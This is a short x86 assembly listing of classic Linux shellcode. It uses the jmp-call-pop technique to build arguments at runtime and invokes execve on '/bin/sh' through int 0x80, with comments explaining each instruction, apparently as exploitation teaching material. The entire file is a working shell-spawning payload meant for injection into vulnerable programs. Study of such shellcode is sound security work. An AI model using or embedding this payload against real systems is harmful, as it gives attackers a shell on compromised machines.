BITS 32

    jmp short two
one:
    pop ebx
    xor eax, eax
    mov [ebx+7], al     ; Null terminate /bin/sh string
    mov [ebx+8], ebx    ; Put addr from ebx where AAAA is
    mov [ebx+12], eax   ; 4-byte null terminator where BBBB is
    lea ecx, [ebx+8]    ; Load the address of [ebx+8] into ecx for argv ptr
    lea edx, [ebx+12]   ; Environ pointer arg
    mov al, 11
    int 0x80

two:
    call one
    db "/bin/shXAAAABBBB"